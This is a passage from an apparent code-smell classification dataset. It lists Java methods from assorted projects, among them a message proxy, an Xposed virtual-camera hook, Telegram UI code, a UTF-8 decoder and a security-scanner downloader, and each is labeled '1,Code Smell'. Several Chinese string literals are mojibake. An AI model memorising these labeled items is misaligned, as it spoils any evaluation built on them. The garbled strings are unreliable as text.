    source.getCachedChProcessor().processEvent(event);
    source.fileMetricAddSuccStats(strBuff,msgCodec.getGroupId(),msgCodec.getStreamId(),msgCodec.getTopicName(),msgCodec.getStrRemoteIP(),msgCodec.getMsgProcType(),msgCodec.getDataTimeMs(),msgCodec.getMsgPkgTime(),msgCodec.getMsgCount(),1,event.getBody().length);
    source.addMetric(true,event.getBody().length,event);
    if (msgCodec.isNeedResp() && !msgCodec.isOrderOrProxy()) {
      msgCodec.setSuccessInfo();
      responseV0Msg(channel,msgCodec,strBuff);
    }
  }
 catch (  Throwable ex) {
    source.fileMetricAddFailStats(strBuff,msgCodec.getGroupId(),msgCodec.getStreamId(),msgCodec.getTopicName(),msgCodec.getStrRemoteIP(),msgCodec.getMsgProcType(),msgCodec.getDataTimeMs(),msgCodec.getMsgPkgTime(),1);
    source.addMetric(false,event.getBody().length,event);
    if (msgCodec.isNeedResp()) {
      msgCodec.setFailureInfo(DataProxyErrCode.PUT_EVENT_TO_CHANNEL_FAILURE,strBuff.append(""Put msg event to channel failure: "").append(ex.getMessage()).toString());
      strBuff.delete(0,strBuff.length());
      responseV0Msg(channel,msgCodec,strBuff);
    }
    if (logCounter.shouldPrint()) {
      logger.error(""Error writing msg event to channel failure, attrs={}"",msgCodec.getAttr(),ex);
    }
  }
}",1,Code Smell
"private void decodeFramesToImage(MediaCodec decoder,MediaExtractor extractor,MediaFormat mediaFormat){
  boolean is_first=false;
  long startWhen=0;
  MediaCodec.BufferInfo info=new MediaCodec.BufferInfo();
  decoder.configure(mediaFormat,play_surf,null,0);
  boolean sawInputEOS=false;
  boolean sawOutputEOS=false;
  decoder.start();
  final int width=mediaFormat.getInteger(MediaFormat.KEY_WIDTH);
  final int height=mediaFormat.getInteger(MediaFormat.KEY_HEIGHT);
  int outputFrameCount=0;
  while (!sawOutputEOS && !stopDecode) {
    if (!sawInputEOS) {
      int inputBufferId=decoder.dequeueInputBuffer(DEFAULT_TIMEOUT_US);
      if (inputBufferId >= 0) {
        ByteBuffer inputBuffer=decoder.getInputBuffer(inputBufferId);
        int sampleSize=extractor.readSampleData(inputBuffer,0);
        if (sampleSize < 0) {
          decoder.queueInputBuffer(inputBufferId,0,0,0L,MediaCodec.BUFFER_FLAG_END_OF_STREAM);
          sawInputEOS=true;
        }
 else {
          long presentationTimeUs=extractor.getSampleTime();
          decoder.queueInputBuffer(inputBufferId,0,sampleSize,presentationTimeUs,0);
          extractor.advance();
        }
      }
    }
    int outputBufferId=decoder.dequeueOutputBuffer(info,DEFAULT_TIMEOUT_US);
    if (outputBufferId >= 0) {
      if ((info.flags & MediaCodec.BUFFER_FLAG_END_OF_STREAM) != 0) {
        sawOutputEOS=true;
      }
      boolean doRender=(info.size != 0);
      if (doRender) {
        outputFrameCount++;
        if (callback != null) {
          callback.onDecodeFrame(outputFrameCount);
        }
        if (!is_first) {
          startWhen=System.currentTimeMillis();
          is_first=true;
        }
        if (play_surf == null) {
          Image image=decoder.getOutputImage(outputBufferId);
          ByteBuffer buffer=image.getPlanes()[0].getBuffer();
          byte[] arr=new byte[buffer.remaining()];
          buffer.get(arr);
          if (mQueue != null) {
            try {
              mQueue.put(arr);
            }
 catch (            InterruptedException e) {
              XposedBridge.log(""銆怴CAM銆�"" + e.toString());
            }
          }
          if (outputImageFormat != null) {
            HookMain.data_buffer=getDataFromImage(image,COLOR_FormatNV21);
          }
          image.close();
        }
        long sleepTime=info.presentationTimeUs / 1000 - (System.currentTimeMillis() - startWhen);
        if (sleepTime > 0) {
          try {
            Thread.sleep(sleepTime);
          }
 catch (          InterruptedException e) {
            XposedBridge.log(""銆怴CAM銆�"" + e.toString());
            XposedBridge.log(""銆怴CAM銆戠嚎绋嬪欢杩熷嚭閿�"");
          }
        }
        decoder.releaseOutputBuffer(outputBufferId,true);
      }
    }
  }
  if (callback != null) {
    callback.onFinishDecode();
  }
}",1,Code Smell
"void play(String url);
public static boolean play(String url,ThunderCallback callback){
  if (url.startsWith(""tvbox-torrent:"")) {
    int idx=Integer.parseInt(url.substring(14));
    TorrentFileInfo info=torrentFileInfoArrayList.get(idx);
    if (currentTask > 0) {
      XLTaskHelper.instance().stopTask(currentTask);
      currentTask=0L;
    }
    threadPool.execute(new Runnable(){
      @Override public void run(){
        String torrentName=new File(info.torrentPath).getName();
        String cache=cacheRoot + File.separator + torrentName.substring(0,torrentName.lastIndexOf("".""));
        currentTask=XLTaskHelper.instance().addTorrentTask(info.torrentPath,cache,info.mFileIndex);
        if (currentTask < 0)         callback.status(-1,""涓嬭浇鍑洪敊"");
        int count=30;
        while (true) {
          count--;
          if (count <= 0) {
            callback.status(-1,""瑙ｆ瀽涓嬭浇瓒呮椂"");
            break;
          }
          XLTaskInfo taskInfo=XLTaskHelper.instance().getBtSubTaskInfo(currentTask,info.mFileIndex).mTaskInfo;
switch (taskInfo.mTaskStatus) {
case 3:
{
              callback.status(-1,errorInfo(taskInfo.mErrorCode));
              return;
            }
case 1:
case 4:
case 2:
{
            String pUrl=XLTaskHelper.instance().getLoclUrl(cache + File.separator + info.mFileName);
            callback.play(pUrl);
            return;
          }
      }
      try {
        Thread.sleep(1000);
      }
 catch (      InterruptedException e) {
        e.printStackTrace();
      }
    }
  }
}
);
return true;
}
return false;
}",1,Code Smell
"private int addSection(ArrayList<SelectorAdapter.Item> items,CharSequence title,ArrayList<TLRPC.User> users,boolean addSelectAll){
  int h=0;
  if (users.isEmpty()) {
    return h;
  }
  List<Item> userItems=new ArrayList<>();
  int count=0;
  boolean allSelected=true;
  for (  TLRPC.User user : users) {
    if (user.id == userId) {
      continue;
    }
    if (!selectedIds.contains(user.id)) {
      allSelected=false;
    }
    count++;
    h+=dp(56);
    userItems.add(Item.asUser(user,selectedIds.contains(user.id)).withOptions(openOptions(user)));
  }
  if (userItems.isEmpty()) {
    return h;
  }
  h+=dp(32);
  Item header=Item.asTopSection(title);
  if (addSelectAll && count > 1) {
    final boolean finalAllSelected=allSelected;
    header.withRightText(getString(allSelected ? R.string.DeselectAll : R.string.SelectAll),v -> {
      if (finalAllSelected) {
        for (        TLRPC.User user : users) {
          selectedIds.remove(user.id);
          allSelectedObjects.remove(user.id);
        }
      }
 else {
        for (        TLRPC.User user : users) {
          if (!selectedIds.contains(user.id)) {
            selectedIds.add(user.id);
            allSelectedObjects.put(user.id,user);
          }
        }
      }
      checkEditTextHint();
      searchField.updateSpans(true,selectedIds,() -> {
        checkEditTextHint();
        updateList(true,false);
      }
,null);
      updateList(true,true);
      clearSearchAfterSelect();
    }
);
  }
  items.add(header);
  items.addAll(userItems);
  return h;
}",1,Code Smell
"@SuppressLint(""SetTextI18n"") @Override protected void onCreate(@Nullable Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  ActivityBuildBinding binding=ActivityBuildBinding.inflate(getLayoutInflater());
  setContentView(binding.getRoot());
  mSourcePath=binding.sourcePath;
  mSourcePath.setOnKeyListener((v,keyCode,event) -> {
    if (keyCode == KeyEvent.KEYCODE_ENTER) {
      if (event.getAction() == KeyEvent.ACTION_UP) {
        mOutputPath.requestFocus();
      }
      return true;
    }
    return false;
  }
);
  mSourcePathContainer=binding.sourcePathContainer;
  mOutputPath=binding.outputPath;
  mOutputPath.setOnKeyListener((v,keyCode,event) -> {
    if (keyCode == KeyEvent.KEYCODE_ENTER) {
      if (event.getAction() == KeyEvent.ACTION_UP) {
        TextView nextField=(TextView)mOutputPath.focusSearch(View.FOCUS_DOWN);
        if (nextField != null) {
          nextField.requestFocus();
        }
      }
      return true;
    }
    return false;
  }
);
  mAppName=binding.appName;
  mPackageName=binding.packageName;
  mPackageName.setOnKeyListener((v,keyCode,event) -> {
    if (keyCode == KeyEvent.KEYCODE_ENTER) {
      if (event.getAction() == KeyEvent.ACTION_UP) {
        mVersionName.requestFocus();
      }
      return true;
    }
    return false;
  }
);
  mVersionName=binding.versionName;
  mVersionCode=binding.versionCode;
  mIcon=binding.appIcon;
  mIcon.setOnClickListener(v -> selectIcon());
  mAppConfig=binding.appConfig;
  mFlexboxAbis=binding.flexboxAbis;
  initAbisChildren();
  syncAbisWithApp();
  mFlexboxLibs=binding.flexboxLibraries;
  initLibsChildren();
  binding.fab.setOnClickListener(v -> buildApk());
  binding.selectSource.setOnClickListener(v -> selectSourceFilePath());
  binding.selectOutput.setOnClickListener(v -> selectOutputDirPath());
  binding.textAbis.setOnClickListener(v -> toggleAllFlexboxChildren(mFlexboxAbis));
  binding.textAbis.setOnLongClickListener(v -> {
    syncAbisWithApp();
    return true;
  }
);
  binding.textLibs.setOnClickListener(v -> toggleAllFlexboxChildren(mFlexboxLibs));
  setToolbarAsBack(R.string.text_build_apk);
  mSource=getIntent().getStringExtra(EXTRA_SOURCE);
  if (mSource != null) {
    setupWithSourceFile(new ScriptFile(mSource));
  }
}",1,Code Smell
"public static int decodeUTF8Strict(byte[] sa,int sp,int len,char[] da){
  final int sl=sp + len;
  int dp=0;
  int dlASCII=Math.min(len,da.length);
  while (dp < dlASCII && sa[sp] >= 0) {
    da[dp++]=(char)sa[sp++];
  }
  while (sp < sl) {
    int b1=sa[sp++];
    if (b1 >= 0) {
      da[dp++]=(char)b1;
    }
 else     if ((b1 >> 5) == -2 && (b1 & 0x1e) != 0) {
      if (sp < sl) {
        int b2=sa[sp++];
        if ((b2 & 0xc0) != 0x80) {
          return -1;
        }
 else {
          da[dp++]=(char)(((b1 << 6) ^ b2) ^ (((byte)0xC0 << 6) ^ ((byte)0x80)));
        }
        continue;
      }
      return -1;
    }
 else     if ((b1 >> 4) == -2) {
      if (sp + 1 < sl) {
        int b2=sa[sp++];
        int b3=sa[sp++];
        if ((b1 == (byte)0xe0 && (b2 & 0xe0) == 0x80) || (b2 & 0xc0) != 0x80 || (b3 & 0xc0) != 0x80) {
          return -1;
        }
 else {
          char c=(char)((b1 << 12) ^ (b2 << 6) ^ (b3 ^ (((byte)0xE0 << 12) ^ ((byte)0x80 << 6) ^ ((byte)0x80))));
          if (Character.isSurrogate(c)) {
            return -1;
          }
 else {
            da[dp++]=c;
          }
        }
        continue;
      }
      return -1;
    }
 else     if ((b1 >> 3) == -2) {
      if (sp + 2 < sl) {
        int b2=sa[sp++];
        int b3=sa[sp++];
        int b4=sa[sp++];
        int uc=((b1 << 18) ^ (b2 << 12) ^ (b3 << 6)^ (b4 ^ (((byte)0xF0 << 18) ^ ((byte)0x80 << 12) ^ ((byte)0x80 << 6)^ ((byte)0x80))));
        if (((b2 & 0xc0) != 0x80 || (b3 & 0xc0) != 0x80 || (b4 & 0xc0) != 0x80) || !Character.isSupplementaryCodePoint(uc)) {
          return -1;
        }
 else {
          da[dp++]=Character.highSurrogate(uc);
          da[dp++]=Character.lowSurrogate(uc);
        }
        continue;
      }
      return -1;
    }
 else {
      return -1;
    }
  }
  return dp;
}",1,Code Smell
"public QuoteHighlight(View view,ViewParent parent,int id,ArrayList<MessageObject.TextLayoutBlock> blocks,int start,int end,float offsetX){
  this.t=new AnimatedFloat(0,() -> {
    if (view != null)     view.invalidate();
    if (parent instanceof View)     ((View)parent).invalidate();
  }
,350,420,CubicBezierInterpolator.EASE_OUT_QUINT);
  this.id=id;
  this.start=start;
  this.end=end;
  if (blocks == null)   return;
  paint.setPathEffect(new CornerPathEffect(dp(4)));
  boolean isRtl=false;
  for (int i=0; i < blocks.size(); ++i) {
    final MessageObject.TextLayoutBlock block=blocks.get(i);
    if (block == null)     continue;
    if (start > block.charactersEnd || end < block.charactersOffset)     continue;
    final int blockStart=Math.max(0,start - block.charactersOffset);
    final int blockEnd=Math.min(end - block.charactersOffset,block.charactersEnd - block.charactersOffset);
    currentOffsetX=-offsetX;
    if (block.code && !block.quote) {
      currentOffsetX+=dp(10);
    }
    currentOffsetY=block.textYOffset + block.padTop;
    minX=block.quote ? dp(10) : 0;
    isRtl=isRtl || AndroidUtilities.isRTL(block.textLayout.getText());
    if (isRtl) {
      block.textLayout.getSelectionPath(blockStart,blockEnd,this);
    }
 else {
      getSelectionPath(block.textLayout,blockStart,blockEnd);
    }
  }
  if (rectangles.size() > 0) {
    Rect firstRect=rectangles.get(0);
    Rect lastRect=rectangles.get(rectangles.size() - 1);
    firstRect.first=true;
    firstRect.top-=dp(.66f);
    lastRect.last=true;
    lastRect.bottom+=dp(.66f);
  }
}",1,Code Smell
"/** 
 * @return A list of subscriber IDs if networkType is {@link NetworkCapabilities#TRANSPORT_CELLULAR}, or a singleton array with  {@code null} being the only element.
 */
@SuppressLint({""HardwareIds"",""MissingPermission""}) @RequiresApi(Build.VERSION_CODES.M) @NonNull private static List<String> getSubscriberIds(@NonNull Context context,@Transport int networkType){
  if (networkType != TRANSPORT_CELLULAR) {
    return Collections.singletonList(null);
  }
  PackageManager pm=context.getPackageManager();
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && !pm.hasSystemFeature(PackageManager.FEATURE_TELEPHONY_SUBSCRIPTION)) {
    Log.i(TAG,""No such feature: %s"",PackageManager.FEATURE_TELEPHONY_SUBSCRIPTION);
    return Collections.emptyList();
  }
 else   if (!pm.hasSystemFeature(PackageManager.FEATURE_TELEPHONY)) {
    Log.i(TAG,""No such feature: %s"",PackageManager.FEATURE_TELEPHONY);
    return Collections.emptyList();
  }
  if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q && !SelfPermissions.checkSelfOrRemotePermission(Manifest.permission.READ_PHONE_STATE)) {
    Log.w(TAG,""Missing required permission: %s"",Manifest.permission.READ_PHONE_STATE);
    return Collections.emptyList();
  }
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && !SelfPermissions.checkSelfOrRemotePermission(ManifestCompat.permission.READ_PRIVILEGED_PHONE_STATE)) {
    Log.w(TAG,""Missing required permission: %s"",ManifestCompat.permission.READ_PRIVILEGED_PHONE_STATE);
    return Collections.singletonList(null);
  }
  List<SubscriptionInfo> subscriptionInfoList=SubscriptionManagerCompat.getActiveSubscriptionInfoList();
  if (subscriptionInfoList == null) {
    Log.i(TAG,""No subscriptions found."");
    return Collections.singletonList(null);
  }
  List<String> subscriberIds=new ArrayList<>();
  for (  SubscriptionInfo info : subscriptionInfoList) {
    int subscriptionId=info.getSubscriptionId();
    try {
      String subscriberId=SubscriptionManagerCompat.getSubscriberIdForSubscriber(subscriptionId);
      subscriberIds.add(subscriberId);
    }
 catch (    SecurityException ignore) {
    }
  }
  return subscriberIds.isEmpty() ? Collections.singletonList(null) : subscriberIds;
}
",1,Code Smell
"private static boolean isUserSuspended(AppIdentifier appIdentifier,Storage storage,Main main,@Nullable String email,@Nullable String userId) throws StorageQueryException {
  if (!isDashboardFeatureFlagEnabled(main,appIdentifier)) {
    DashboardUser[] users=StorageUtils.getDashboardStorage(storage).getAllDashboardUsers(appIdentifier);
    if (email != null) {
      for (int i=0; i < MAX_NUMBER_OF_FREE_DASHBOARD_USERS; i++) {
        if (email.equals(users[i].email)) {
          return false;
        }
      }
    }
 else     if (userId != null) {
      for (int i=0; i < MAX_NUMBER_OF_FREE_DASHBOARD_USERS; i++) {
        if (userId.equals(users[i].userId)) {
          return false;
        }
      }
    }
 else {
      throw new IllegalStateException(""Should never come here"");
    }
    return true;
  }
  return false;
}",1,Code Smell
"/** 
 * Query group's offset records stored in broker.
 * @param msgStore       history offset store
 * @param groupName      group name
 * @param requestOffset  request offset
 * @param recordStamp    record timestamp
 * @param msgCount       at most record count
 * @param maxRetryCnt    max query turns
 * @param strBuff        string buffer
 */
private void queryGroupStoredOffsets(MessageStore msgStore,String groupName,long requestOffset,long recordStamp,int msgCount,int maxRetryCnt,StringBuilder strBuff){
  int msgTypeCode;
  int partitionId;
  int msgAccCnt=0;
  boolean msgMatched;
  Throwable qryThrow;
  GetMessageResult getMessageResult;
  msgTypeCode=groupName.hashCode();
  partitionId=Math.abs(msgTypeCode) % TServerConstants.OFFSET_HISTORY_NUMPARTS;
  Set<String> filterCodes=new HashSet<>();
  filterCodes.add(groupName);
  ConsumerNodeInfo consumerNodeInfo=new ConsumerNodeInfo(broker.getStoreManager(),groupName,""offsetConsumer"",filterCodes,"""",System.currentTimeMillis(),"""","""");
  int qryRetryCount=0;
  long itemInitOffset=requestOffset;
  int maxTransferSize=broker.getStoreManager().getMaxMsgTransferSize();
  do {
    qryThrow=null;
    try {
      getMessageResult=msgStore.getMessages(303,itemInitOffset,partitionId,consumerNodeInfo,TServerConstants.OFFSET_HISTORY_NAME,maxTransferSize,recordStamp);
    }
 catch (    Throwable e2) {
      qryThrow=e2;
      continue;
    }
    if (getMessageResult.transferedMessageList == null || getMessageResult.transferedMessageList.isEmpty()) {
      itemInitOffset+=getMessageResult.lastReadOffset;
      continue;
    }
    msgMatched=false;
    List<Message> messageList=DataConverterUtil.convertMessage(TServerConstants.OFFSET_HISTORY_NAME,getMessageResult.transferedMessageList);
    for (    Message message : messageList) {
      if (message == null) {
        continue;
      }
      if (!groupName.equals(message.getAttrValue(TServerConstants.TOKEN_OFFSET_GROUP))) {
        continue;
      }
      msgMatched=true;
      if (msgAccCnt++ == 0) {
        strBuff.append(""{\""groupName\"":\"""").append(groupName).append(""\"",\""result\"":true,\""errMsg\"":\""ok\"",\""records\"":["").append(StringUtils.newStringUtf8(message.getData()));
      }
 else {
        strBuff.append("","").append(StringUtils.newStringUtf8(message.getData()));
      }
      if (msgAccCnt >= msgCount) {
        break;
      }
    }
    if (msgMatched) {
      break;
    }
    itemInitOffset+=getMessageResult.lastReadOffset;
  }
 while (++qryRetryCount < maxRetryCnt);
  if (msgAccCnt > 0) {
    strBuff.append(""],\""recordCount\"":"").append(msgAccCnt).append(""}"");
  }
 else {
    if (qryThrow == null) {
      strBuff.append(""{\""groupName\"":\"""").append(groupName).append(""\"",\""result\"":false,\""errMsg\"":\""Could not find record!\""}"");
    }
 else {
      strBuff.append(""{\""groupName\"":\"""").append(groupName).append(""\"",\""result\"":false,\""errMsg\"":\""Get Message failure: "").append(qryThrow.getMessage()).append(""\""}"");
    }
  }
}",1,Code Smell
"private void getConfirmFlow(List<FlowVO> flowVOS,List<ModuleFieldValueBO> fieldValueBOS,List<FlowVO> flowVOList,List<FlowDataDealRecord> records,Long moduleId,Integer version){
  Map<Long,FlowDataDealRecord> flowIdRecordMap=CollUtil.isEmpty(records) ? MapUtil.newHashMap() : records.stream().collect(Collectors.toMap(FlowDataDealRecord::getFlowId,Function.identity()));
  for (  FlowVO flowVO : flowVOS) {
    if (ObjectUtil.notEqual(FlowTypeEnum.START.getType(),flowVO.getFlowType())) {
      JSONArray data=flowVO.getData().getJSONArray(""data"");
      String dataJsonString=Optional.ofNullable(data).orElse(new JSONArray()).toJSONString();
      List<FlowVO.FlowCondition> conditionList=JSON.parseArray(dataJsonString,FlowVO.FlowCondition.class);
      if (MapUtil.isNotEmpty(flowIdRecordMap) && flowIdRecordMap.containsKey(flowVO.getFlowId())) {
        FlowDataDealRecord record=flowIdRecordMap.get(flowVO.getFlowId());
        if (ObjectUtil.isNotNull(record)) {
          if (CollUtil.isNotEmpty(conditionList)) {
            FlowVO.FlowCondition flowCondition=conditionList.stream().filter(c -> ObjectUtil.equal(record.getConditionId(),c.getConditionId())).findFirst().orElse(null);
            if (ObjectUtil.isNull(flowCondition)) {
              continue;
            }
            this.getConfirmFlow(flowCondition.getFlowDataList(),fieldValueBOS,flowVOList,records,moduleId,version);
          }
 else {
            flowVO.setFlowStatus(record.getFlowStatus());
            flowVOList.add(flowVO);
          }
          continue;
        }
      }
      if (CollUtil.isNotEmpty(conditionList)) {
        for (        FlowVO.FlowCondition flowCondition : conditionList) {
          List<FlowConditionBO> conditionBOS=flowCondition.getConditionDataList();
          if (CollUtil.isNotEmpty(conditionBOS)) {
            boolean isPass=conditionPass(conditionBOS,fieldValueBOS,moduleId,version);
            if (isPass) {
              if (CollUtil.isNotEmpty(flowCondition.getFlowDataList())) {
                this.getConfirmFlow(flowCondition.getFlowDataList(),fieldValueBOS,flowVOList,records,moduleId,version);
              }
 else {
                flowVOList.add(flowVO);
              }
              break;
            }
          }
        }
        if (CollUtil.isEmpty(flowVOList)) {
          return;
        }
      }
 else {
        flowVOList.add(flowVO);
      }
    }
 else {
      flowVOList.add(flowVO);
    }
  }
}
",1,Code Smell
"public void visit_RETURN(PcodeOp pcode,AbsEnv inOutEnv,AbsEnv tmpEnv){
  Function function=context.getFunction();
  if (function.hasNoReturn()) {
    return;
  }
  for (  Entry<ALoc,KSet> entry : inOutEnv.getEnvMap()) {
    ALoc aLoc=entry.getKey();
    if (aLoc.isSP()) {
      if (GlobalState.arch.isX86()) {
        KSet spKSet=inOutEnv.get(aLoc);
        KSet adjustedKSet=adjustLocalAbsVal(spKSet);
        if (adjustedKSet != null) {
          inOutEnv.set(aLoc,adjustedKSet,true);
        }
      }
 else {
        inOutEnv.set(aLoc,KSet.getBot(aLoc.getLen() * 8),true);
      }
    }
 else     if (aLoc.getRegion().isLocal()) {
      Function localFunction=((Local)aLoc.getRegion()).getFunction();
      Function currentFunction=context.getFunction();
      if (localFunction == currentFunction) {
        inOutEnv.set(aLoc,KSet.getBot(aLoc.getLen() * 8),true);
      }
    }
  }
  AbsEnv oldExitEnv=new AbsEnv(context.getExitValue());
  AbsEnv resEnv=oldExitEnv.join(inOutEnv);
  if (resEnv == null) {
    return;
  }
  context.setExitValue(resEnv.getEnvMap());
  long[] callString=context.getCallString();
  Function[] callStringFunctions=context.getFuncs();
  Address lastCallSite=GlobalState.flatAPI.toAddr(callString[GlobalState.config.getCallStringK() - 1]);
  Function lastFunction=callStringFunctions[GlobalState.config.getCallStringK() - 1];
  if (lastFunction == null) {
    return;
  }
  long[] prevCallString=context.popLast();
  Set<long[]> callStringSet=ContextTransitionTable.getInstance().get(lastCallSite,prevCallString);
  if (callStringSet == null) {
    return;
  }
  for (  long[] cs : callStringSet) {
    Context callerCtx=Context.getContext(lastFunction,cs);
    if (callerCtx != null) {
      callerCtx.insertToWorklist(lastCallSite);
      if (!Context.isWait(callerCtx)) {
        Context.pushActive(callerCtx);
      }
    }
  }
}",1,Code Smell
"private void updateFieldRight(int attachVisible){
  if (messageEditText == null || editingMessageObject != null) {
    return;
  }
  FrameLayout.LayoutParams layoutParams=(FrameLayout.LayoutParams)messageEditText.getLayoutParams();
  int oldRightMargin=layoutParams.rightMargin;
  if (attachVisible == 1) {
    if (botButton != null && botButton.getVisibility() == VISIBLE && scheduledButton != null && scheduledButton.getVisibility() == VISIBLE && attachLayout != null && attachLayout.getVisibility() == VISIBLE) {
      layoutParams.rightMargin=AndroidUtilities.dp(146);
    }
 else     if (botButton != null && botButton.getVisibility() == VISIBLE || notifyButton != null && notifyButton.getVisibility() == VISIBLE || scheduledButton != null && scheduledButton.getTag() != null) {
      layoutParams.rightMargin=AndroidUtilities.dp(98);
    }
 else {
      layoutParams.rightMargin=AndroidUtilities.dp(50);
    }
  }
 else   if (attachVisible == 2) {
    if (layoutParams.rightMargin != AndroidUtilities.dp(2)) {
      if (botButton != null && botButton.getVisibility() == VISIBLE && scheduledButton != null && scheduledButton.getVisibility() == VISIBLE && attachLayout != null && attachLayout.getVisibility() == VISIBLE) {
        layoutParams.rightMargin=AndroidUtilities.dp(146);
      }
 else       if (botButton != null && botButton.getVisibility() == VISIBLE || notifyButton != null && notifyButton.getVisibility() == VISIBLE || scheduledButton != null && scheduledButton.getTag() != null) {
        layoutParams.rightMargin=AndroidUtilities.dp(98);
      }
 else {
        layoutParams.rightMargin=AndroidUtilities.dp(50);
      }
    }
  }
 else {
    if (scheduledButton != null && scheduledButton.getTag() != null) {
      layoutParams.rightMargin=AndroidUtilities.dp(50);
    }
 else {
      layoutParams.rightMargin=AndroidUtilities.dp(2);
    }
  }
  if (oldRightMargin != layoutParams.rightMargin) {
    messageEditText.setLayoutParams(layoutParams);
  }
}",1,Code Smell
"@Override protected void propagateBlockChanges(final LightChunkGetter lightAccess,final ChunkAccess atChunk,final Set<BlockPos> positions){
  this.rewriteNibbleCacheForSkylight(atChunk);
  Arrays.fill(this.nullPropagationCheckCache,false);
  final BlockGetter world=lightAccess.getLevel();
  final int chunkX=atChunk.getPos().x;
  final int chunkZ=atChunk.getPos().z;
  final int heightMapOffset=chunkX * -16 + (chunkZ * (-16 * 16));
  for (  final BlockPos pos : positions) {
    final int index=pos.getX() + (pos.getZ() << 4) + heightMapOffset;
    final int curr=this.heightMapBlockChange[index];
    if (pos.getY() > curr) {
      this.heightMapBlockChange[index]=pos.getY();
    }
  }
  for (int index=0; index < (16 * 16); ++index) {
    final int maxY=this.heightMapBlockChange[index];
    if (maxY == Integer.MIN_VALUE) {
      continue;
    }
    this.heightMapBlockChange[index]=Integer.MIN_VALUE;
    final int columnX=(index & 15) | (chunkX << 4);
    final int columnZ=(index >>> 4) | (chunkZ << 4);
    final int maxPropagationY=this.tryPropagateSkylight(world,columnX,maxY,columnZ,true,true);
    final long propagateDirection=AxisDirection.POSITIVE_Y.everythingButThisDirection;
    final int encodeOffset=this.coordinateOffset;
    if (this.getLightLevelExtruded(columnX,maxPropagationY,columnZ) == 15) {
      this.checkNullSection(columnX >> 4,maxPropagationY >> 4,columnZ >> 4,true);
      for (int currY=maxPropagationY; currY >= (this.minLightSection << 4); --currY) {
        if ((currY & 15) == 15) {
          this.checkNullSection(columnX >> 4,(currY >> 4),columnZ >> 4,true);
        }
        final SWMRNibbleArray nibble=this.getNibbleFromCache(columnX >> 4,currY >> 4,columnZ >> 4);
        if (nibble == null) {
          currY=(currY) & (~15);
          continue;
        }
        if (nibble.getUpdating(columnX,currY,columnZ) != 15) {
          break;
        }
        this.appendToDecreaseQueue(((columnX + (columnZ << 6) + (currY << (6 + 6))+ encodeOffset) & ((1L << (6 + 6 + 16)) - 1)) | (15L << (6 + 6 + 16)) | (propagateDirection << (6 + 6 + 16+ 4)));
      }
    }
  }
  this.processDelayedIncreases();
  this.processDelayedDecreases();
  for (  final BlockPos pos : positions) {
    this.checkBlock(lightAccess,pos.getX(),pos.getY(),pos.getZ());
  }
  this.performLightDecrease(lightAccess);
}",1,Code Smell
"private void initDownload(){
  downButton.addActionListener(e -> new Thread(() -> {
    if (MainForm.LANG == MainForm.CHINESE) {
      JOptionPane.showMessageDialog(this.xrayDownPanel,""鐩墠浠呮敮鎸佷笅杞� 1.9.6 鐗堟湰"");
    }
 else {
      JOptionPane.showMessageDialog(this.xrayDownPanel,""Only support download 1.9.6 version"");
    }
    if (windowsAmd64RadioButton.isSelected()) {
      osType=""xray_windows_amd64.exe.zip"";
    }
 else     if (windows386RadioButton.isSelected()) {
      osType=""xray_windows_386.exe.zip"";
    }
 else     if (linux386RadioButton.isSelected()) {
      osType=""xray_linux_386.zip"";
    }
 else     if (linuxAmd64RadioButton.isSelected()) {
      osType=""xray_linux_amd64.zip"";
    }
 else     if (darwinAmd64RadioButton.isSelected()) {
      osType=""xray_darwin_amd64.zip"";
    }
 else     if (darwinArm64RadioButton.isSelected()) {
      osType=""xray_darwin_arm64.zip"";
    }
 else {
      return;
    }
    progressBar.setValue(1);
    OkHttpClient okHttpClient=new OkHttpClient();
    String finalUrl=String.format(""%s/%s/%s"",xrayDownBase,xrayVersion,osType);
    progressBar.setValue(2);
    Request request=new Request.Builder().url(finalUrl).addHeader(""Connection"",""close"").build();
    progressBar.setValue(3);
    okHttpClient.newCall(request).enqueue(new Callback(){
      @Override public void onFailure(      Call call,      IOException e){
        e.printStackTrace();
      }
      @Override public void onResponse(      Call call,      Response response){
        InputStream is=null;
        byte[] buf=new byte[2048];
        int len;
        FileOutputStream fos=null;
        try {
          if (response.body() == null) {
            return;
          }
          is=response.body().byteStream();
          long total=response.body().contentLength();
          File file=new File(savePath,finalUrl.substring(finalUrl.lastIndexOf(""/"") + 1));
          fos=new FileOutputStream(file);
          progressBar.setValue(4);
          long sum=0;
          while ((len=is.read(buf)) != -1) {
            fos.write(buf,0,len);
            sum+=len;
            int progress=(int)(sum * 1.0f / total * 100);
            if (progress < 4) {
              progress=4;
            }
            progressBar.setValue(progress);
          }
          fos.flush();
        }
 catch (        Exception e) {
          e.printStackTrace();
        }
 finally {
          try {
            if (is != null)             is.close();
          }
 catch (          IOException ignored) {
          }
          try {
            if (fos != null)             fos.close();
          }
 catch (          IOException ignored) {
          }
          finish=true;
        }
      }
    }
);
  }
).start());
}",1,Code Smell
"/** 
 * Fill disappearing items, i.e. the items are moved out of window, we need give them final location so recyclerview will run a slide out animation. The positions that was greater than last visible index will be appended to end, the positions that was smaller than first visible index will be prepend to beginning.
 * @param positions Sorted list of positions of disappearing items.
 * @param positionToRow Which row we want to put the disappearing item.
 */
public void fillDisappearingItems(int[] positions,int positionsLength,SparseIntArray positionToRow){
  final int lastPos=getLastVisibleIndex();
  final int resultSearchLast=lastPos >= 0 ? Arrays.binarySearch(positions,0,positionsLength,lastPos) : 0;
  if (resultSearchLast < 0) {
    int firstDisappearingIndex=-resultSearchLast - 1;
    int edge;
    if (mReversedFlow) {
      edge=mProvider.getEdge(lastPos) - mProvider.getSize(lastPos) - mSpacing;
    }
 else {
      edge=mProvider.getEdge(lastPos) + mProvider.getSize(lastPos) + mSpacing;
    }
    for (int i=firstDisappearingIndex; i < positionsLength; i++) {
      int disappearingIndex=positions[i];
      int disappearingRow=positionToRow.get(disappearingIndex);
      if (disappearingRow < 0) {
        disappearingRow=0;
      }
      int size=mProvider.createItem(disappearingIndex,true,mTmpItem,true);
      mProvider.addItem(mTmpItem[0],disappearingIndex,size,disappearingRow,edge);
      if (mReversedFlow) {
        edge=edge - size - mSpacing;
      }
 else {
        edge=edge + size + mSpacing;
      }
    }
  }
  final int firstPos=getFirstVisibleIndex();
  final int resultSearchFirst=firstPos >= 0 ? Arrays.binarySearch(positions,0,positionsLength,firstPos) : 0;
  if (resultSearchFirst < 0) {
